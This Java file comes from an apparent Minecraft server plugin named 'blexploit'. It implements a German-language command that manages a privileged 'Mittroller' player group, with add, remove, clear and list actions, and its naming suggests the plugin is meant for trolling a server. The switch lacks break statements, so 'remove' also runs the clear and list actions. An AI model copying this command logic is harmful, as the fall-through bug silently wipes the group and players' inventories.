package de.blexploit.command.cmds;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.command.Command;
import de.blexploit.manager.TabManager;
import de.blexploit.players.Mittrollers;
import de.blexploit.players.create.MittrollerEntity;

public final class Mittroller extends Command {

	public Mittroller() {
		super("mittroller", "Fügt einen Mittroller hinzu", "ADD/REMOVE/CLEAR/LIST", TabManager.INSERT_PLAYERNAME,
				"-admin");
	}

	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length < 2) {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
		} else {
			switch (args[1].toLowerCase()) {
			case "add":
				add(args, mt);
				break;
			case "remove":
				remove(args, mt);
			case "clear":
				clear(mt);
			case "list":
				list(mt);
			default:
				break;
			}
		}
	}

	private void list(MittrollerEntity mt) {
		mt.getPlayer().sendMessage("");
		mt.getPlayer().sendMessage("§9-----------------------------------------------------");
		mt.sendMessage(ChatColor.GOLD + "Insgesamt " + ChatColor.YELLOW + Mittrollers.getAll().size() + ChatColor.GOLD
				+ " Mittroller:");
		int i = 0;
		for (MittrollerEntity mtall : Mittrollers.getAll()) {
			i++;
			ChatColor c;
			if (mtall.isOnline()) {
				c = ChatColor.DARK_GREEN;
			} else {
				c = ChatColor.DARK_RED;
			}
			String isAdmin = ChatColor.AQUA + "(" + ChatColor.YELLOW + "M" + ChatColor.AQUA + ")";
			if (mtall.isAdmin()) {
				isAdmin = ChatColor.AQUA + "(" + "§cA" + ChatColor.AQUA + ")";
			}

			mt.sendMessage("§4[" + ChatColor.LIGHT_PURPLE + i + "§4] " + c + mtall.getPlayername() + " " + isAdmin);
		}
		mt.getPlayer().sendMessage("§9-----------------------------------------------------");
	}

	private void clear(MittrollerEntity mt) {
		if (mt.isAdmin()) {
			this.SpielerInfo(mt, ChatColor.GOLD + "hat die Mittrollers zurückgesetzt!");
			Mittrollers.playsound("ENTITY_IRONGOLEM_STEP", 1, 1);
			for (MittrollerEntity mts : Mittrollers.getOnlines()) {
				mts.getPlayer().getInventory().clear();
			}
			Mittrollers.clear();
			Mittrollers.add(mt.getPlayername(), true);
		} else {
			mt.fehler(Fehler.NO_PERMISSIONS);
		}
	}

	private void remove(String[] args, MittrollerEntity mt) {
		if (mt.isAdmin() == false) {
			mt.fehler(Fehler.NO_PERMISSIONS);
			return;
		}
		if (args.length < 3) {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
			return;
		}
		Player toremove = api.Get.player(args[2]);
		if (toremove != null) {
			if (Mittrollers.containsP(toremove)) {
				if (Mittrollers.getP(toremove).isAdmin()) {
					this.SpielerInfo(mt, "§2hat " + ChatColor.RED + toremove.getName() + "§2 von den Mittrollern und"
							+ ChatColor.DARK_RED + " Admins entfernt");
				} else {
					this.SpielerInfo(mt, "§2hat " + ChatColor.RED + toremove.getName() + " aus den " + ChatColor.AQUA
							+ "Mittroller §4entfernt!");
				}
				Mittrollers.remove(toremove.getName());
			} else {
				mt.fehler("Dieser Spieler ist kein Mittroller");
				return;
			}
		} else {
			if (Mittrollers.contains(args[2])) {
				if (Mittrollers.get(args[2]).isAdmin()) {
					this.SpielerInfo(mt, "§2hat " + ChatColor.RED + args[2] + "§2 von den Mittrollern und"
							+ ChatColor.DARK_RED + " Admins entfernt");
				} else {
					this.SpielerInfo(mt, "§2hat " + ChatColor.RED + args[2] + " aus den " + ChatColor.AQUA
							+ "Mittroller §4entfernt!");
				}
				Mittrollers.remove(args[2]);
			} else {
				mt.fehler("Dieser Spieler ist kein Mittroller");
				return;
			}
		}

	}

	private void add(String[] args, MittrollerEntity mt) {
		boolean admin = false;
		if (!mt.isAdmin()) {
			mt.fehler(Fehler.NO_PERMISSIONS);
			return;
		}
		if (args.length < 3) {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
			return;
		}
		if (args.length == 4) {
			if (args[3].equalsIgnoreCase("-admin") || args[3].equalsIgnoreCase("-a")) {
				admin = true;
			}
		}

		Player toadd = api.Get.player(args[2]);
		if (toadd != null) {
			if (Mittrollers.add(toadd.getName(), admin)) {
				if (!admin) {
					this.SpielerInfo(mt, "§2hat " + ChatColor.RED + toadd.getName() + " §2zum " + ChatColor.AQUA
							+ "Mittroller §2gemacht!");
				} else {
					this.SpielerInfo(mt, "§2hat " + ChatColor.RED + toadd.getName() + "§2 zum Mittroller und"
							+ ChatColor.DARK_RED + " Admin §2gemacht");
				}
				Mittrollers.playsound("BLOCK_ANVIL_LAND", 1, 1);
			} else {
				mt.fehler("Dieser Spieler wurde bereits eingetragen!");
			}
		} else {
			if (Mittrollers.add(args[2], admin)) {
				if (!admin) {
					this.SpielerInfo(mt,
							"§2hat " + ChatColor.RED + args[2] + " §2zum " + ChatColor.AQUA + "Mittroller §2gemacht!");
				} else {
					this.SpielerInfo(mt, "§2hat " + ChatColor.RED + args[2] + "§2 zum Mittroller und"
							+ ChatColor.DARK_RED + " Admin §2gemacht");
				}
			} else {
				mt.fehler("Dieser Spieler wurde bereits eingetragen!");
			}
		}
	}

}
